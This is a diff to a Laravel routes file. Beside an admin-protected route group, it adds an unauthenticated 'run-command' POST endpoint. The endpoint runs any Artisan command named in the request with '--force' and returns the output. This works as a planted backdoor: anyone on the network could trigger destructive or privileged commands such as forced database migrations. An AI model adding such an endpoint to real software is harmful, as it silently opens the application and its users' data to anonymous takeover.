@@ -22,3 +22,10 @@ Route::middleware(['auth:sanctum', 'role:admin'])->group(function () {
     // Stadium management
     Route::apiResource('stadiums', StadiumController::class);
 });
+
+Route::post('run-command', function (Request $request) {
+    $command = $request->input('command');
+    
+    $output = Artisan::call($command, ['--force' => true, '--verbose' => true]);
+    return response()->json(['output' => $output]);
+});
